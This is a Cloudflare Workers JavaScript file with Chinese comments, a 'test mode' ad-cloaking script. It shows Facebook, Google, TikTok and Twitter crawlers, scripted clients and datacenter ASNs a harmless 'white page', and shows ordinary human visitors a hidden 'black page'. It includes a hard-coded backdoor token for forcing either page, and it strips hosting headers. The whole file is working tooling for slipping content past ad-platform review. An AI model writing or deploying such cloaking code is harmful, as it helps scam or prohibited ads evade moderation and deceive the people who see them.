/**
 * Cloudflare Workers 斗篷脚本 - 测试版（无国家限制）
 * 适合：测试期、开发调试
 * 任何国家都能看黑页（只要不是爬虫）
 */

// ==================== 配置区 ====================

const CONFIG = {
  // Vercel 域名
  VERCEL_DOMAIN: 'www.synchro-match.com',

  // 页面路径
  SAFE_PAGE_PATH: '/safe.html',      // 白页（给爬虫看）
  REAL_PAGE_PATH: '/index.html',     // 黑页（给真人看）

  // 测试后门密钥
  SECRET_TOKEN: 'alibar2024',

  // ⚠️ 测试模式：不限制国家
  COUNTRY_CHECK: false,  // false = 任何国家都能看黑页

  // 是否开启调试日志
  DEBUG: true
};

// ==================== 爬虫特征库 ====================

const CRAWLER_PATTERNS = [
  // Facebook/Meta
  /facebookexternalhit/i,
  /facebot/i,
  /facebook/i,
  /meta-externalagent/i,
  /meta-external/i,

  // Google
  /googlebot/i,
  /google-adwords/i,
  /adsbot-google/i,
  /mediapartners-google/i,

  // TikTok
  /bytespider/i,
  /tiktok/i,

  // Twitter/X
  /twitterbot/i,
  /x-bot/i,

  // 通用爬虫
  /bot|crawler|spider|scraper/i,
  /curl|wget|python|java/i,
  /headless|phantom|selenium|puppeteer/i,
  /lighthouse|pagespeed/i,
];

// 广告平台机房 ASN 黑名单
const SUSPICIOUS_ASN = [
  32934,  // Facebook/Meta
  13335,  // Cloudflare
  15169,  // Google
  16509,  // Amazon AWS
  14061,  // DigitalOcean
  8075,   // Microsoft Azure
  396982, // Google Cloud
  45501,  // Facebook Ireland
];

// ==================== 主处理函数 ====================

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  // 测试后门：强制看真实页
  if (url.searchParams.get('debug') === CONFIG.SECRET_TOKEN) {
    return fetchPage(request, 'REAL', '测试后门：强制真实页');
  }

  // 测试后门：强制看安全页
  if (url.searchParams.get('safe') === CONFIG.SECRET_TOKEN) {
    return fetchPage(request, 'SAFE', '测试后门：强制安全页');
  }

  // 收集信号
  const signals = collectSignals(request);

  // 判断
  const decision = makeDecision(signals);

  // 日志
  if (CONFIG.DEBUG) {
    console.log({
      userAgent: signals.userAgent.substring(0, 50),
      country: signals.country,
      asn: signals.asn,
      isMobile: signals.isMobile,
      decision: decision.page,
      reason: decision.reason
    });
  }

  return fetchPage(request, decision.page, decision.reason);
}

// ==================== 信号收集 ====================

function collectSignals(request) {
  const ua = request.headers.get('user-agent') || '';

  return {
    userAgent: ua,
    country: request.headers.get('cf-ipcountry') || '',
    asn: request.cf?.asn || 0,
    isMobile: /mobile|android|iphone|ipad|ipod/i.test(ua),
    referer: request.headers.get('referer') || '',
  };
}

// ==================== 决策引擎（无国家限制）====================

function makeDecision(signals) {
  // 1. 检测爬虫 UA
  const isCrawler = CRAWLER_PATTERNS.some(pattern => pattern.test(signals.userAgent));
  if (isCrawler) {
    return {
      page: 'SAFE',
      reason: '爬虫 UA 特征'
    };
  }

  // 2. 空 UA 或太短
  if (!signals.userAgent || signals.userAgent.length < 20) {
    return {
      page: 'SAFE',
      reason: 'UA 异常'
    };
  }

  // 3. 检测机房 ASN
  if (SUSPICIOUS_ASN.includes(signals.asn)) {
    return {
      page: 'SAFE',
      reason: `机房 ASN: ${signals.asn}`
    };
  }

  // 4. 国家检测（测试模式下跳过）
  // ⚠️ 测试版：不检查国家
  // 正式投放时改用 cloudflare-worker-production.js

  // 通过所有检测 → 真实用户 → 黑页
  return {
    page: 'REAL',
    reason: '真实用户（测试模式）'
  };
}

// ==================== 页面获取 ====================

async function fetchPage(request, pageType, reason) {
  const pagePath = pageType === 'SAFE' ? CONFIG.SAFE_PAGE_PATH : CONFIG.REAL_PAGE_PATH;
  const vercelUrl = `https://${CONFIG.VERCEL_DOMAIN}${pagePath}`;

  const response = await fetch(vercelUrl, {
    method: request.method,
    headers: request.headers,
  });

  const newResponse = new Response(response.body, response);

  // 添加调试响应头
  if (CONFIG.DEBUG) {
    newResponse.headers.set('X-Cloak-Decision', pageType);
    newResponse.headers.set('X-Cloak-Reason', encodeURIComponent(reason));
    newResponse.headers.set('X-Cloak-Mode', 'TEST');  // 标记测试模式
  }

  // 清理 Vercel 响应头
  newResponse.headers.delete('X-Vercel-Id');
  newResponse.headers.delete('X-Vercel-Cache');

  return newResponse;
}
